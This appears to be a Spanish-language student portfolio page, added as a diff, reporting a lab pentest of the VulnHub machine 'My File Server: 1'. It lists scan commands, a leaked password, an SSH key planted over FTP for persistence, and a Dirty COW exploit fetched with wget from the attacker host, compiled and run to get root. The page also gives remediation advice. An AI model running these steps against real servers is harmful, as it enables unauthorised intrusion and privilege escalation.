@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MDTS — Actividad 13: Red Team Report — Pentesting My File Server: 1 | CNO IV</title>
+<meta name="description" content="Actividad 13 — Red Team Report: Pentesting de la máquina vulnerable My File Server: 1 (VulnHub). Metodología PTES/OSSTMM, explotación completa y escalada con Dirty COW.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-color: #111411;
+    --box-bg: #1a1f1a;
+    --text-color: #a3cfa8;
+    --accent: #107C10;
+    --accent-bright: #5DC21E;
+    --border-color: #2b402c;
+    --shadow-color: #080a08;
+  }
+  body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Share Tech Mono', monospace; line-height: 1.6; margin: 0; padding: 20px; font-size: 1.05rem; }
+  .container { max-width: 1000px; margin: 0 auto; }
+  h1, h2, h3, .tech-title { font-family: 'Orbitron', sans-serif; color: #e0f2e3; margin-top: 0; letter-spacing: 1px; }
+  h1 { font-size: 2rem; margin-bottom: 5px; line-height: 1.2; }
+  h2 { font-size: 1.4rem; border-bottom: 3px solid var(--border-color); display: inline-block; padding-bottom: 5px; text-transform: uppercase; margin-top: 40px; }
+  h3 { font-size: 1.1rem; color: var(--accent-bright); margin-bottom: 10px; }
+  a { color: var(--accent-bright); text-decoration: none; font-weight: bold; }
+  a:hover { text-decoration: underline; background-color: var(--accent); color: #ffffff; }
+  code { background: #0d100d; border: 1px solid var(--border-color); padding: 2px 6px; color: var(--accent-bright); font-size: 0.95rem; }
+  .box { background-color: var(--box-bg); border: 3px solid var(--border-color); box-shadow: 6px 6px 0px var(--shadow-color); padding: 25px; margin-bottom: 30px; border-radius: 2px; }
+  header { margin-bottom: 40px; }
+  .id-card { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; border-bottom: 2px dashed var(--border-color); padding-bottom: 10px; margin-bottom: 20px; }
+  nav ul { list-style: none; padding: 0; display: flex; gap: 15px; flex-wrap: wrap; }
+  nav a { border: 2px solid var(--border-color); padding: 5px 10px; background: var(--bg-color); box-shadow: 3px 3px 0px var(--shadow-color); color: var(--accent-bright); text-transform: uppercase; font-size: 0.9rem; }
+  nav a:hover { background: var(--accent); color: #ffffff; text-decoration: none; transform: translate(-2px, -2px); box-shadow: 5px 5px 0px var(--shadow-color); border-color: var(--accent); }
+  .tag { display: inline-block; border: 1px solid var(--accent-bright); background-color: var(--bg-color); color: var(--accent-bright); padding: 3px 10px; font-size: 0.8rem; font-weight: bold; margin-right: 5px; margin-bottom: 5px; text-transform: uppercase; border-radius: 2px; }
+  .tag-red { border-color: #c0392b; color: #e74c3c; }
+  .tag-blue { border-color: #3498db; color: #3498db; }
+  .sys-log { color: #68856b; font-size: 0.85rem; }
+  a.btn { font-family: 'Orbitron', sans-serif; font-weight: bold; font-size: 0.9rem; background: var(--bg-color); color: var(--accent-bright); border: 3px solid var(--border-color); padding: 10px 18px; cursor: pointer; box-shadow: 4px 4px 0px var(--shadow-color); transition: all 0.1s; letter-spacing: 1px; display: inline-flex; align-items: center; gap: 8px; text-transform: uppercase; }
+  a.btn:hover { background: var(--accent); color: #ffffff; border-color: var(--accent); text-decoration: none; transform: translate(-2px, -2px); box-shadow: 6px 6px 0px var(--shadow-color); }
+  a.btn:active { box-shadow: 0px 0px 0px var(--shadow-color); transform: translate(4px, 4px); }
+  .btn-pdf { border-color: #c0392b; color: #e74c3c; }
+  .btn-pdf:hover { background: #c0392b; border-color: #c0392b; }
+  .btn-pptx { border-color: #d35400; color: #e67e22; }
+  .btn-pptx:hover { background: #d35400; border-color: #d35400; }
+  .evidence { background: #0d100d; border: 3px solid var(--border-color); box-shadow: 6px 6px 0px var(--shadow-color); padding: 15px; margin: 25px 0; }
+  .evidence img { max-width: 100%; height: auto; display: block; border: 1px solid var(--border-color); }
+  .evidence .cap { margin-top: 10px; font-size: 0.85rem; color: #68856b; border-top: 2px dashed var(--border-color); padding-top: 8px; }
+  .evidence .cap strong { color: var(--accent-bright); }
+  .lab-payload { background: #0d100d; border-left: 4px solid var(--accent-bright); padding: 12px 15px; font-size: 0.95rem; color: var(--accent-bright); margin: 15px 0; word-break: break-all; }
+  .lab-payload.red { border-left-color: #e74c3c; color: #e74c3c; }
+  table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.95rem; }
+  th, td { border: 2px solid var(--border-color); padding: 10px; text-align: left; }
+  th { background: var(--bg-color); color: #e0f2e3; font-family: 'Orbitron', sans-serif; font-size: 0.85rem; text-transform: uppercase; }
+  td { background: #0d100d; vertical-align: top; }
+  .sev-critica { color: #e74c3c; font-weight: bold; }
+  .sev-alta { color: #e67e22; font-weight: bold; }
+  .sev-media { color: #f2c500; font-weight: bold; }
+  .solved-banner { background: var(--accent); color: #ffffff; font-family: 'Orbitron', sans-serif; text-align: center; padding: 15px; font-size: 1.1rem; letter-spacing: 1px; box-shadow: 4px 4px 0px var(--shadow-color); margin: 20px 0; }
+  .flag-box { background: #0d100d; border: 3px solid #e74c3c; box-shadow: 6px 6px 0px var(--shadow-color); padding: 15px; margin: 20px 0; text-align: center; color: #e74c3c; font-size: 1.2rem; font-weight: bold; word-break: break-all; }
+  footer { text-align: center; margin-top: 50px; padding-top: 20px; border-top: 3px solid var(--border-color); font-size: 0.9rem; color: #68856b; }
+</style>
+<base target="_blank">
+</head>
+<body>
+
+<div class="container">
+  <header class="box">
+    <div class="id-card">
+      <div>
+        <strong style="color: #e0f2e3; font-family: 'Orbitron', sans-serif; font-size: 1.2rem;">Manuel Darío Trejo Salazar (MDTS)</strong><br>
+        <span class="sys-log">Univ. Politécnica de San Luis Potosí (UPSLP) | CNO IV Seguridad Informática | 7.º Semestre</span>
+      </div>
+      <div style="font-family: 'Orbitron', sans-serif; font-size: 2.5rem; font-weight: bold; color: var(--accent-bright);">MT</div>
+    </div>
+    <nav>
+      <ul>
+        <li><a href="index.html">/inicio</a></li>
+        <li><a href="parcial2.html">/segundo_parcial</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <section class="box">
+      <span class="tech-title" style="font-size: 1rem; color: var(--accent-bright);">[ SEGUNDO PARCIAL — ACTIVIDAD 13 ]</span>
+      <h1>Red Team Report: Pentesting de My File Server: 1</h1>
+      <p class="sys-log">VulnHub — Armour Infosec | Metodología: PTES / OSSTMM | Máquina atacante: Kali Linux</p>
+      <div style="margin-top: 15px;">
+        <span class="tag">Actividad 13</span>
+        <span class="tag tag-red">Red Team</span>
+        <span class="tag">Pentest</span>
+        <span class="tag tag-blue">Dirty COW</span>
+        <span class="tag">CVE-2016-5195</span>
+      </div>
+    </section>
+
+    <!-- 1. NOMBRE -->
+    <section class="box">
+      <h2>01_Nombre de la máquina objetivo</h2>
+      <p><strong style="color:#e0f2e3;">My File Server: 1</strong> — máquina vulnerable de la plataforma VulnHub, creada por Akanksha Sachin Verma (Armour Infosec). Simula un entorno corporativo orientado a servicios de almacenamiento/servidor de archivos.</p>
+      <p>URL de la máquina: <a href="https://www.vulnhub.com/entry/my-file-server-1,432/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/my-file-server-1,432/</a></p>
+      <div class="evidence">
+        <img src="img/act13_1.png" alt="Banner de arranque de My File Server: 1">
+        <div class="cap"><strong>Evidencia 1:</strong> Banner de arranque de la máquina víctima (CentOS 7, kernel 3.10.0-229.el7, hostname fileserver).</div>
+      </div>
+    </section>
+
+    <!-- 2. CONTEXTO Y ALCANCE -->
+    <section class="box">
+      <h2>02_Contexto y alcance del engagement</h2>
+      <p><strong>Rol:</strong> analista Red Team contratado por la organización para evaluar el nivel de exposición del sistema, simulando el comportamiento de un atacante externo con una evaluación de explotación real.</p>
+      <table>
+        <tr><th>Elemento</th><th>Detalle</th></tr>
+        <tr><td>Objetivo</td><td>My File Server: 1 — 192.168.153.128/24</td></tr>
+        <tr><td>Máquina atacante</td><td>Kali Linux — 192.168.153.129/24</td></tr>
+        <tr><td>Red de laboratorio</td><td>192.168.153.0/24 (NAT aislado VMware, sin sistemas de producción)</td></tr>
+        <tr><td>Fecha de ejecución</td><td>29–30 de septiembre de 2026</td></tr>
+        <tr><td>Fuera de alcance</td><td>Sistemas fuera del segmento, DoS prolongado, ingeniería social</td></tr>
+      </table>
+      <p><strong>Reglas de compromiso:</strong> actividad realizada en laboratorio aislado con fines educativos; las pruebas se limitaron a identificar, explotar y documentar vulnerabilidades sin alterar información de forma destructiva; toda la evidencia se preservó con capturas, comandos y salidas.</p>
+      <div class="evidence">
+        <img src="img/act13_2.png" alt="Entorno de laboratorio VMware">
+        <div class="cap"><strong>Evidencia 2:</strong> Entorno de laboratorio: máquina víctima (MyFileServer1) y Kali Linux activas en VMware.</div>
+      </div>
+    </section>
+
+    <!-- 3. OBJETIVOS -->
+    <section class="box">
+      <h2>03_Objetivos</h2>
+      <h3>Objetivo general</h3>
+      <p>Desarrollar un informe técnico profesional de pruebas de penetración sobre la máquina vulnerable My File Server: 1, aplicando una metodología estructurada de evaluación de seguridad, documentando hallazgos, evidencias técnicas, análisis de riesgo y propuestas de mitigación.</p>
+      <h3>Objetivos específicos</h3>
+      <ul>
+        <li>Aplicar una metodología formal de pentesting (reconocimiento, enumeración, explotación y post-explotación).</li>
+        <li>Identificar, explotar y documentar vulnerabilidades presentes en la máquina objetivo.</li>
+        <li>Elaborar un informe técnico profesional con estructura ejecutiva y técnica: evaluación de impacto (modelo CIA) y recomendaciones de remediación.</li>
+      </ul>
+    </section>
+
+    <!-- 4. METODOLOGÍA -->
+    <section class="box">
+      <h2>04_Metodología aplicada</h2>
+      <p>El engagement siguió una metodología estructurada alineada con <strong style="color:#e0f2e3;">PTES</strong> (Penetration Testing Execution Standard) y buenas prácticas <strong style="color:#e0f2e3;">OSSTMM</strong>, organizada en cinco fases:</p>
+      <table>
+        <tr><th>Fase</th><th>Objetivo</th><th>Herramientas</th></tr>
+        <tr><td>1. Reconocimiento</td><td>Descubrir hosts, puertos, servicios y versiones</td><td>arp-scan, netdiscover, nmap (-p-, -A, NSE)</td></tr>
+        <tr><td>2. Enumeración</td><td>Usuarios, recursos compartidos y archivos expuestos</td><td>smbmap, nikto, ftp</td></tr>
+        <tr><td>3. Explotación</td><td>Acceso inicial abusando de debilidades identificadas</td><td>Credenciales expuestas, inyección de clave SSH por FTP</td></tr>
+        <tr><td>4. Post-explotación / Escalada</td><td>Elevar privilegios hasta root y recolectar evidencias</td><td>wget, gcc, searchsploit, Exploit-DB 40616 (Dirty COW)</td></tr>
+        <tr><td>5. Análisis y reporte</td><td>Impacto CIA, cuantificación de riesgo y recomendaciones</td><td>Matriz de riesgo, CVSS v3.1</td></tr>
+      </table>
+    </section>
+
+    <!-- 5. RECONOCIMIENTO -->
+    <section class="box">
+      <h2>05_Fase de reconocimiento</h2>
+      <p>Se verificó la configuración de red de Kali y se identificó el objetivo activo dentro del segmento mediante ARP scanning:</p>
+      <div class="lab-payload">$ ip a  →  eth0: inet 192.168.153.129/24<br>$ sudo arp-scan -l  →  192.168.153.128  00:0c:29:dd:c8:7d  VMware, Inc.<br>$ netdiscover -i eth0 -r 192.168.153.0/24</div>
+      <div class="evidence">
+        <img src="img/act13_3.png" alt="ip a y arp-scan">
+        <div class="cap"><strong>Evidencia 3:</strong> Configuración de red de Kali y descubrimiento de hosts con arp-scan.</div>
+      </div>
+      <div class="evidence">
+        <img src="img/act13_4.png" alt="Comando netdiscover">
+        <div class="cap"><strong>Evidencia 4:</strong> Lanzamiento del escaneo de descubrimiento con netdiscover.</div>
+      </div>
+      <div class="evidence">
+        <img src="img/act13_5.png" alt="Resultados netdiscover">
+        <div class="cap"><strong>Evidencia 5:</strong> Confirmación del host activo 192.168.153.128 (VMware) en el segmento.</div>
+      </div>
+      <p>Se ejecutó un escaneo agresivo de todos los puertos TCP con detección de versiones, sistema operativo y scripts NSE:</p>
+      <div class="lab-payload">$ nmap -p- -A 192.168.153.128</div>
+      <div class="evidence">
+        <img src="img/act13_6.png" alt="Nmap parte 1">
+        <div class="cap"><strong>Evidencia 6:</strong> Nmap (parte 1): FTP anónimo con pub escribible, SSH, HTTP con TRACE activo y rpcbind.</div>
+      </div>
+      <div class="evidence">
+        <img src="img/act13_7.png" alt="Nmap parte 2">
+        <div class="cap"><strong>Evidencia 7:</strong> Nmap (parte 2): Samba 4.9.1, NFS, ProFTPD anónimo, detección de SO Linux 3.4–3.10.</div>
+      </div>
+      <p><strong>Superficie de ataque identificada</strong> (8 puertos, 3 protocolos de transferencia de archivos):</p>
+      <table>
+        <tr><th>Puerto</th><th>Servicio</th><th>Versión</th><th>Observación</th></tr>
+        <tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.2</td><td>Login anónimo; directorio "pub" escribible (drwxrwxrwx)</td></tr>
+        <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.4</td><td>Acceso remoto cifrado; vector como usuario válido</td></tr>
+        <tr><td>80/tcp</td><td>HTTP</td><td>Apache 2.4.6</td><td>Método TRACE activo; sin cabeceras de seguridad</td></tr>
+        <tr><td>111/tcp</td><td>RPC</td><td>rpcbind 2-4</td><td>Requerido por NFS</td></tr>
+        <tr><td>445/tcp</td><td>SMB</td><td>Samba 4.9.1</td><td>Workgroup SAMBA; recurso compartido expuesto</td></tr>
+        <tr><td>2049/tcp</td><td>NFS</td><td>nfs_acl 3</td><td>Sistema de archivos de red accesible</td></tr>
+        <tr><td>2121/tcp</td><td>FTP</td><td>ProFTPD 1.3.5</td><td>Segundo FTP; login anónimo permitido</td></tr>
+        <tr><td>20048/tcp</td><td>mountd</td><td>1-3</td><td>Montaje NFS expuesto</td></tr>
+      </table>
+    </section>
+
+    <!-- 6. ENUMERACIÓN -->
+    <section class="box">
+      <h2>06_Fase de enumeración</h2>
+      <h3>Enumeración SMB</h3>
+      <div class="lab-payload">$ smbmap -H 192.168.153.128</div>
+      <p>El recurso <code>smbdata</code> es accesible con permisos de LECTURA y ESCRITURA sin credenciales (sesión NULL), y revela el nombre de usuario <code>smbuser</code> — una divulgación de información que facilita la explotación.</p>
+      <div class="evidence">
+        <img src="img/act13_8.png" alt="smbmap smbdata READ WRITE">
+        <div class="cap"><strong>Evidencia 8:</strong> smbmap: recurso smbdata con permisos READ/WRITE en sesión NULL y usuario smbuser revelado.</div>
+      </div>
+      <h3>Enumeración web</h3>
+      <div class="lab-payload">$ nikto -h 192.168.153.128</div>
+      <p>Nikto reveló Apache 2.4.6 desactualizado, método TRACE activo (vulnerable a XST), ausencia de cabeceras de seguridad y el archivo <code>/readme.txt</code>:</p>
+      <div class="evidence">
+        <img src="img/act13_9.png" alt="Nikto readme.txt">
+        <div class="cap"><strong>Evidencia 9:</strong> Nikto: Apache desactualizado, TRACE activo, cabeceras ausentes y /readme.txt detectado.</div>
+      </div>
+      <p>Al acceder a <code>http://192.168.153.128/readme.txt</code> se expone una contraseña en texto plano:</p>
+      <div class="lab-payload red">My Password is rootroot1</div>
+      <div class="evidence">
+        <img src="img/act13_10.png" alt="readme.txt contraseña expuesta">
+        <div class="cap"><strong>Evidencia 10:</strong> Credencial expuesta en readme.txt — la puerta de entrada al sistema.</div>
+      </div>
+    </section>
+
+    <!-- 7. EXPLOTACIÓN -->
+    <section class="box">
+      <h2>07_Fase de explotación — acceso inicial</h2>
+      <p>Las credenciales <code>smbuser / rootroot1</code> fueron validadas contra el FTP de la víctima. Se optó por inyectar una clave pública SSH autorizada mediante FTP, en lugar del acceso directo con contraseña.</p>
+      <p>Generación del par de claves en Kali:</p>
+      <div class="lab-payload">$ ssh-keygen -t rsa</div>
+      <div class="evidence">
+        <img src="img/act13_11.png" alt="ssh-keygen">
+        <div class="cap"><strong>Evidencia 11:</strong> Generación del par de claves RSA en la máquina atacante.</div>
+      </div>
+      <p>Login FTP con las credenciales obtenidas:</p>
+      <div class="lab-payload">$ ftp 192.168.153.128  →  Name: smbuser  →  230 Login successful.</div>
+      <div class="evidence">
+        <img src="img/act13_12.png" alt="FTP login smbuser">
+        <div class="cap"><strong>Evidencia 12:</strong> Login FTP exitoso con smbuser / rootroot1.</div>
+      </div>
+      <div class="evidence">
+        <img src="img/act13_13.png" alt="FTP pwd">
+        <div class="cap"><strong>Evidencia 13:</strong> Directorio inicial del usuario: /home/smbuser.</div>
+      </div>
+      <p>El directorio <code>~/.ssh</code> no existía (error 550), por lo que fue necesario crearlo antes de subir la clave — detalle que refuerza la falta de hardening:</p>
+      <div class="lab-payload">ftp&gt; mkdir .ssh  →  257 "/home/smbuser/.ssh" created<br>ftp&gt; cd .ssh  →  250 Directory successfully changed.<br>ftp&gt; put /root/.ssh/id_rsa.pub authorized_keys  →  226 Transfer complete.</div>
+      <div class="evidence">
+        <img src="img/act13_14.png" alt="Inyección de clave SSH por FTP">
+        <div class="cap"><strong>Evidencia 14:</strong> Creación de ~/.ssh e inyección de la clave pública como authorized_keys.</div>
+      </div>
+      <p>Acceso remoto sin contraseña:</p>
+      <div class="lab-payload">$ ssh smbuser@192.168.153.128<br>$ whoami → smbuser | $ id → uid=1000(smbuser)<br>$ uname -a → Linux fileserver 3.10.0-229.el7.x86_64 ...</div>
+      <div class="evidence">
+        <img src="img/act13_15.png" alt="Acceso SSH smbuser">
+        <div class="cap"><strong>Evidencia 15:</strong> Sesión SSH como smbuser (uid=1000). La persistencia queda garantizada mientras exista la clave autorizada.</div>
+      </div>
+    </section>
+
+    <!-- 8. ESCALADA -->
+    <section class="box">
+      <h2>08_Escalada de privilegios — Dirty COW (CVE-2016-5195)</h2>
+      <p>El kernel 3.10.0-229.el7 (CentOS 7, marzo de 2015) no incorpora el parche de Dirty COW: una condición de carrera en el subsistema de memoria del kernel que permite escribir sobre archivos de solo lectura (como /usr/bin/passwd) elevando privilegios a root.</p>
+      <p>Desde Kali se localizó el exploit en Exploit-DB y se sirvió por HTTP:</p>
+      <div class="lab-payload">$ searchsploit -m 40616   →   Copied to: /home/rinzler/40616.c<br>$ python3 -m http.server 8000</div>
+      <div class="evidence">
+        <img src="img/act13_16.png" alt="searchsploit y http.server">
+        <div class="cap"><strong>Evidencia 16:</strong> Descarga del exploit 40616.c con searchsploit y servidor HTTP en Kali.</div>
+      </div>
+      <p>Desde la sesión SSH se descargó, compiló y ejecutó el exploit:</p>
+      <div class="lab-payload">$ wget http://192.168.153.129:8000/40616.c  →  200 OK<br>$ gcc 40616.c -o cowroot -pthread<br>$ ls -l cowroot  →  -rwxrwxr-x 1 smbuser smbuser 14291 ... cowroot<br>$ ./cowroot</div>
+      <div class="evidence">
+        <img src="img/act13_17.png" alt="wget y gcc del exploit">
+        <div class="cap"><strong>Evidencia 17:</strong> Descarga del exploit desde Kali y compilación con gcc en la víctima.</div>
+      </div>
+      <div class="evidence">
+        <img src="img/act13_18.png" alt="Ejecución cowroot">
+        <div class="cap"><strong>Evidencia 18:</strong> Ejecución del exploit DirtyCow en el servidor objetivo.</div>
+      </div>
+      <p>Al ser una condición de carrera, la primera ejecución perdió la carrera entre hilos ("thread stopped") y fue necesario reintentar. En la segunda ejecución el exploit sobreescribió /usr/bin/passwd y otorgó la shell de root:</p>
+      <div class="lab-payload red">/usr/bin/passwd is overwritten<br>Popping root shell.<br>[root@fileserver smbuser]# id<br>uid=0(root) gid=1000(smbuser) groups=0(root),1000(smbuser)</div>
+      <div class="evidence">
+        <img src="img/act13_19.png" alt="Dirty COW exitoso uid=0">
+        <div class="cap"><strong>Evidencia 19:</strong> Primer intento fallido (carrera perdida) y segundo intento exitoso con uid=0(root).</div>
+      </div>
+      <div class="evidence">
+        <img src="img/act13_20.png" alt="Flujo completo de escalada">
+        <div class="cap"><strong>Evidencia 20:</strong> Flujo completo de escalada: wget, gcc, cowroot y shell de root.</div>
+      </div>
+      <p>Prueba de compromiso total — lectura de /root/proof.txt, archivo exclusivo del superusuario:</p>
+      <div class="lab-payload">[root@fileserver root]# cat proof.txt<br>Best of Luck</div>
+      <div class="flag-box">FLAG: af52e0163b03cbf7c6dd146351594a43</div>
+      <div class="evidence">
+        <img src="img/act13_21.png" alt="proof.txt flag">
+        <div class="cap"><strong>Evidencia 21:</strong> Lectura de /root/proof.txt — flag de compromiso total del servidor.</div>
+      </div>
+      <div class="solved-banner">✔ ROOT OBTENIDO — SERVIDOR COMPROMETIDO TOTALMENTE</div>
+    </section>
+
+    <!-- 9. HALLAZGOS Y CIA -->
+    <section class="box">
+      <h2>09_Hallazgos y análisis de impacto (modelo CIA)</h2>
+      <table>
+        <tr><th>ID</th><th>Vulnerabilidad</th><th>Severidad</th></tr>
+        <tr><td>H-01</td><td>Credenciales expuestas en readme.txt (smbuser / rootroot1)</td><td class="sev-critica">CRÍTICA</td></tr>
+        <tr><td>H-02</td><td>FTP vsftpd 3.0.2 con acceso anónimo y directorio pub escribible</td><td class="sev-alta">ALTA</td></tr>
+        <tr><td>H-03</td><td>Segundo FTP (ProFTPD 1.3.5, 2121) con acceso anónimo</td><td class="sev-media">MEDIA</td></tr>
+        <tr><td>H-04</td><td>Recurso SMB smbdata accesible sin autenticación (READ/WRITE); divulga usuario</td><td class="sev-alta">ALTA</td></tr>
+        <tr><td>H-05</td><td>Kernel 3.10.0-229.el7 sin parchear — Dirty COW (CVE-2016-5195), escalada a root</td><td class="sev-critica">CRÍTICA</td></tr>
+        <tr><td>H-06</td><td>Apache 2.4.6 desactualizado, TRACE activo, sin cabeceras de seguridad</td><td class="sev-media">MEDIA</td></tr>
+        <tr><td>H-07</td><td>NFS (2049) y mountd (20048) expuestos sin restricciones de red</td><td class="sev-media">MEDIA</td></tr>
+      </table>
+      <table>
+        <tr><th>Dimensión CIA</th><th>Evaluación</th></tr>
+        <tr><td>Confidencialidad</td><td><span class="sev-critica">ALTA / COMPROMETIDA</span> — acceso root implica lectura total de archivos, configuraciones y hashes.</td></tr>
+        <tr><td>Integridad</td><td><span class="sev-critica">ALTA / COMPROMETIDA</span> — escritura anónima y root permiten alterar, borrar o reemplazar cualquier archivo.</td></tr>
+        <tr><td>Disponibilidad</td><td><span class="sev-alta">MEDIA-ALTA / COMPROMETIDA</span> — control root permite cifrar o destruir información (escenario ransomware).</td></tr>
+      </table>
+      <p><strong style="color:#e0f2e3;">Nivel de riesgo general: CRÍTICO (CVSS 9.0–10.0 en la cadena de ataque).</strong> El servidor quedó comprometido en sus tres dimensiones con técnicas de baja complejidad y herramientas públicas.</p>
+    </section>
+
+    <!-- 10. RECOMENDACIONES -->
+    <section class="box">
+      <h2>10_Recomendaciones de remediación</h2>
+      <ul>
+        <li><strong>Parchear el kernel (inmediata):</strong> versión posterior a CVE-2016-5195 y proceso continuo de gestión de parches. [H-05]</li>
+        <li><strong>Eliminar credenciales expuestas (inmediata):</strong> retirar /readme.txt, gestor de secretos y política de contraseñas robustas. [H-01]</li>
+        <li><strong>Cerrar acceso anónimo (inmediata):</strong> anonymous_enable=NO en vsftpd y ProFTPD; eliminar escritura en directorios públicos. [H-02, H-03]</li>
+        <li><strong>Restringir SMB (alta):</strong> autenticación robusta, mínimo privilegio y SMB firmado/cifrado. [H-04]</li>
+        <li><strong>Restringir NFS (alta):</strong> /etc/exports limitado a hosts autorizados + firewall. [H-07]</li>
+        <li><strong>Actualizar Apache (media):</strong> desactivar TRACE y añadir cabeceras de seguridad. [H-06]</li>
+        <li><strong>Auditar claves SSH (alta):</strong> eliminar authorized_keys no legítimos y alertar de nuevas claves. [cadena de explotación]</li>
+        <li><strong>Segmentar y monitorear (alta):</strong> VLAN dedicada, firewall con puertos mínimos e IDS. [superficie de ataque]</li>
+      </ul>
+      <div style="margin-top: 30px; text-align: center;">
+        <a href="InformeMyFileServer1.docx" class="btn btn-pdf" download>⬇ DESCARGAR INFORME (DOCX)</a>
+        &nbsp;&nbsp;
+        <a href="PresentacionMyFileServer1.pptx" class="btn btn-pptx" download>⬇ DESCARGAR PRESENTACIÓN (PPTX)</a>
+      </div>
+    </section>
+
+    <!-- 11. CONCLUSIÓN -->
+    <section class="box">
+      <h2>11_Conclusión</h2>
+      <p>El servidor My File Server: 1 fue comprometido por completo en una sola sesión mediante una cadena de tres debilidades de baja complejidad: credenciales expuestas públicamente, servicios de archivos sin autenticación y un kernel sin parchear explotable con Dirty COW. Ningún vector requirió habilidades avanzadas: herramientas públicas y credenciales a la vista fueron suficientes.</p>
+      <p>La buena noticia: todas las vulnerabilidades tienen solución conocida, documentada y de bajo costo relativo. Con el plan de remediación de 30-60-90 días (contención, corrección y fortalecimiento), la organización puede pasar de una exposición crítica a un nivel de riesgo bajo y demostrable.</p>
+    </section>
+  </main>
+
+  <footer>
+    <p>© 2026 Manuel Darío Trejo Salazar (MDTS) — Portafolio CNO IV</p>
+    <p>RED TEAM REPORT | Seguridad Informática</p>
+  </footer>
+</div>
+</body>
+</html>
